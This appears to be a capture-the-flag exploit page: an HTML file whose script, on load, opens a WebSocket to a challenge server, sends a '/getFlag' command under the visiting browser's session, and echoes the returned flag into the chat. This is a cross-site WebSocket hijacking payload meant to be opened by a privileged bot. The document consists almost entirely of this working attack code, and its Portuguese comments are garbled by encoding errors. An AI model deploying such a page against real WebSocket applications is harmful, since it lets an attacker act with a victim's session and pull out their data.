<!DOCTYPE html>
<html>
<head>
    <title>WebSocket Echo Exploit</title>
</head>
<body>
    <h1>Exploiting WebSocket...</h1>
    
    <script>
        // Fun√ß√£o que ser√° executada quando a p√°gina for carregada
        window.onload = function() {
            console.log("P√°gina carregada, iniciando exploit...");
            
            // Conectar ao WebSocket como administrador
            const socket = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
            
            socket.onopen = function() {
                console.log("Conex√£o WebSocket estabelecida");
                
                // Primeiro, solicitar a flag
                setTimeout(function() {
                    console.log("Solicitando flag...");
                    socket.send(JSON.stringify({
                        sender: 'user',
                        message: '/getFlag'
                    }));
                }, 500);
            };
            
            socket.onmessage = function(event) {
                const data = JSON.parse(event.data);
                console.log("Mensagem recebida:", data.message);
                
                // Se recebermos a flag, enviar como mensagem normal para o chat
                if (data.message && data.message.includes('Flag:')) {
                    console.log("Flag encontrada, enviando para o chat...");
                    
                    // Enviar a flag como uma mensagem normal para o chat
                    setTimeout(function() {
                        socket.send(JSON.stringify({
                            sender: 'user',
                            message: 'üèÜ ' + data.message + ' üèÜ'
                        }));
                    }, 500);
                }
            };
            
            socket.onerror = function(error) {
                console.error("Erro:", error);
            };
            
            socket.onclose = function() {
                console.log("Conex√£o fechada");
            };
        };
    </script>
</body>
</html>
